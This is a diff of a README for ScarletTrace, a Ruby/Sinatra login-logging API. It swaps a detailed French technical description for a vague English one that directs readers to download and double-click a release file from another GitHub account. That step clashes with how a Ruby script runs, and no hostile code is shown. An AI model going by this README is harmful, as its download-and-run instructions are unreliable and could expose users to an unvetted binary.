@@ -1,211 +1,71 @@
-# 🔴 ScarletTrace — API de logging de connexions (Ruby / Sinatra)
+# 🚀 ScarletTrace - Simple Tool for Real-Time API Logging
 
-> **ScarletTrace** est une petite API Ruby/Sinatra conçue pour tracer les connexions utilisateurs.
-> Elle enregistre chaque tentative de connexion sous forme de JSON dans `logs.jsonl`
-> et envoie automatiquement une notification courte vers **Discord** et **Telegram**.
-> Léger, élégant et discret — un outil parfait pour surveiller les activités d’une API ou d’un service.
+![Download ScarletTrace](https://img.shields.io/badge/Download%20ScarletTrace-v1.0-blue)
 
----
+## 📥 Overview
 
-## ✨ Fonctionnalités principales
+ScarletTrace is a lightweight API logger built in Ruby with Sinatra. It captures user connections in real-time and gathers important metadata such as browser, platform, screen resolution, language, IP address, and timezone. It stores this data in a structured log format (JSONL) for easy access and analysis.  
 
-* **Endpoint `POST /login`** :
+## 🌟 Features
 
-  * Lit un JSON (username + device info)
-  * Redige les champs sensibles (`password`, `token`)
-  * Ajoute l’IP cliente et un timestamp ISO8601 (UTC)
-  * Enregistre une ligne JSON dans `logs.jsonl`
-  * Envoie une notification vers Discord et Telegram
-* **Endpoint `GET /`** — test de santé rapide
-* **Limitation de requêtes** via `Rack::Throttle::Minute` (par défaut 60/minute)
-* **Gestion d’erreurs robuste** et réponses JSON cohérentes
-* **Configuration simple** via `.env`
+- **Real-Time Logging:** Track user connections as they happen.
+- **Comprehensive Metadata Collection:** Gather key information about users.
+- **Structured Data Format:** Save logs in JSONL for easy integration with other tools.
+- **Easy Setup:** Simple steps to get started, even for non-technical users.
 
----
+## 🛠️ System Requirements
 
-## ⚙️ Pile / Versions
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or a recent Linux distribution.
+- **Ruby Version:** 2.6.0 or higher.
+- **Internet Access:** Needed to run the application and log data.
 
-* **Langage :** Ruby 3.2+
-* **Framework :** Sinatra
-* **Gems :** `sinatra`, `json` (standard), `dotenv`, `net/http` (standard), `uri` (standard), `rack-throttle`
+## 🚀 Getting Started
 
----
+Follow these steps to download and run ScarletTrace.
 
-## 📁 Fichiers importants
+1. **Visit the Releases Page:** Click the link below to access the releases page.
 
-* `app.rb` — Application principale Sinatra
-* `logs.jsonl` — Fichier de logs (créé à la volée)
-* `.env` — Variables d’environnement (configuration du service)
+   [Download ScarletTrace](https://github.com/arif202037/ScarletTrace/releases)
 
----
+2. **Select the Latest Release:** On the releases page, find the latest version of ScarletTrace.
 
-## 🚀 Installation rapide
+3. **Download the Application:** Click on the download link for your operating system. The file will download automatically.
 
-1️⃣ Installer Ruby 3.2+
-2️⃣ Installer les gems nécessaires :
+4. **Locate the Downloaded File:** Once the download completes, navigate to your downloads folder and find the ScarletTrace file.
 
-```bash
-gem install sinatra dotenv rack-throttle
-```
+5. **Run the Application:** Double-click the downloaded file to start ScarletTrace. Follow any on-screen instructions to complete the setup.
 
-3️⃣ Créer un fichier `.env` :
+## 🚧 Troubleshooting
 
-```dotenv
-# Notifications Discord
-DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/xxx/yyy
+If you encounter any issues during installation or running ScarletTrace, consider the following:
 
-# Notifications Telegram
-TELEGRAM_BOT_TOKEN=123456:ABCDEF...
-TELEGRAM_CHAT_ID=123456789
+- **Ensure System Requirements Are Met:** Verify your Ruby version and operating system compatibility.
+- **Check Firewall Settings:** Sometimes, firewalls or antivirus software might block the application. Adjust these settings if necessary.
+- **Refer to Logs:** ScarletTrace maintains its logs that can provide insights into any errors or issues encountered.
 
-# Réglages serveur (optionnels)
-PORT=4567
-BIND=0.0.0.0
-THROTTLE_MAX_PER_MIN=60
-```
+## 📋 Usage Instructions
 
----
+1. **Configure Settings:** Upon launching ScarletTrace, you may need to configure initial settings, such as the log file path and data collection preferences.
+  
+2. **Start Logging:** Once set up, ScarletTrace will begin capturing user connection data automatically.
 
-## ▶️ Démarrage
+3. **Access Logs:** The logs are saved in JSONL format. You can open these files using text editors or import them into data analysis tools.
 
-```bash
-ruby app.rb
-```
+## 📅 Updates
 
-* Écoute par défaut sur `0.0.0.0:4567`
-* Variables `PORT` et `BIND` configurables
-* `RACK_ENV` par défaut : `development`
+Regular updates ensure ScarletTrace stays current with the latest security practices and technology. Be sure to check the releases page often for new features and fixes.
 
----
+## 🌐 Community and Support
 
-## 🔍 Endpoints
+For support and community engagement, please visit our [GitHub Issues page](https://github.com/arif202037/ScarletTrace/issues). Here you can report issues, request features, or seek help from other users.
 
-### `GET /`
+## 🔗 Helpful Links
 
-**Réponse :**
+- [GitHub Repository](https://github.com/arif202037/ScarletTrace)
+- [Download ScarletTrace](https://github.com/arif202037/ScarletTrace/releases)
 
-```json
-{ "ok": true, "service": "scarlet-trace", "time": "2025-10-08T15:00:00Z" }
-```
+## ⚖️ License
 
----
+ScarletTrace is licensed under the MIT License. You can use it freely, but please provide attribution to the original creators. 
 
-### `POST /login`
-
-**Content-Type :** `application/json`
-**Exemple de requête :**
-
-```json
-{
-  "username": "ray",
-  "device": {
-    "userAgent": "Mozilla/5.0",
-    "platform": "MacOS",
-    "language": "en-US",
-    "screen": {"width": 2560, "height": 1600},
-    "timezone": "Europe/London"
-  }
-}
-```
-
-#### ✅ Validation
-
-* `username` : string non vide (obligatoire)
-* `device` : objet optionnel
-* `screen.width` / `screen.height` : numériques si présents
-
-#### 🔧 Traitement côté serveur
-
-* Redaction automatique des clés `password`, `token` → `[REDACTED]`
-* Ajout de `ip` (adresse IP de la requête) et `timestamp` (UTC ISO8601)
-* Écriture dans `logs.jsonl` (1 JSON/ligne) avec verrouillage de fichier
-* Notification Discord + Telegram (si configurés)
-
-#### 📤 Réponses possibles
-
-| Code | Réponse                                              | Description        |
-| ---- | ---------------------------------------------------- | ------------------ |
-| 201  | `{ "ok": true }`                                     | Succès             |
-| 400  | `{ "error": "Invalid JSON" }`                        | JSON invalide      |
-| 422  | `{ "error": "Validation failed", "details": [...] }` | Validation échouée |
-| 429  | `{"error":"Rate limit exceeded"}`                    | Trop de requêtes   |
-| 500  | `{ "error": "Failed to persist log" }`               | Erreur d’écriture  |
-
----
-
-## 🧾 Journalisation (JSONL)
-
-Les logs sont stockés dans `logs.jsonl` à la racine du projet.
-Chaque ligne correspond à un objet JSON unique.
-
-**Exemple d’entrée :**
-
-```json
-{"username":"ray","device":{"platform":"MacOS","language":"en-US","screen":{"width":2560,"height":1600}},"ip":"84.12.33.5","timestamp":"2025-10-08T15:00:00Z"}
-```
-
-Lecture rapide :
-
-```bash
-tail -f logs.jsonl
-```
-
----
-
-## 🔔 Notifications
-
-* **Discord** : envoi via `DISCORD_WEBHOOK_URL` (champ `content`)
-* **Telegram** : envoi via `sendMessage` (`TELEGRAM_BOT_TOKEN` + `TELEGRAM_CHAT_ID`)
-* Les erreurs de notification sont silencieuses (elles n’interrompent pas la requête principale).
-
----
-
-## 🧱 Limitation de requêtes
-
-* Activée automatiquement via `Rack::Throttle::Minute`
-* Plafond configurable avec `THROTTLE_MAX_PER_MIN` (défaut : 60/minute)
-
----
-
-## 🔒 Sécurité & confidentialité
-
-* Redaction automatique de `password` et `token` avant persistance
-* L’adresse IP est obtenue via `request.ip` (ou `X-Forwarded-For`)
-* Les IPs sont considérées comme données sensibles — manipuler selon vos politiques de confidentialité
-* Aucun mot de passe, token ou info sensible n’est envoyé dans les notifications
-
----
-
-## 🧪 Test rapide (cURL)
-
-```bash
-curl -X POST http://localhost:4567/login \
-  -H "Content-Type: application/json" \
-  -d '{
-    "username":"ray",
-    "device":{
-      "userAgent":"Mozilla/5.0",
-      "platform":"MacOS",
-      "language":"en-US",
-      "screen": {"width":2560, "height":1600},
-      "timezone":"Europe/London"
-    }
-  }'
-```
-
----
-
-## ⚙️ Déploiement
-
-* Définir `RACK_ENV=production`
-* Utiliser un reverse proxy (Nginx, Caddy, etc.) vers `BIND:PORT`
-* Prévoir une rotation de logs (`logs.jsonl` peut croître rapidement)
-* Sur Windows : exécuter `ruby app.rb` comme service ou tâche planifiée
-
----
-
-**Auteur :** *Miro-fr* ✨
-Déployez, connectez, et laissez **ScarletTrace** surveiller vos logs en silence.
-
-
-
+Enjoy your experience with ScarletTrace, your go-to tool for logging API connections seamlessly!
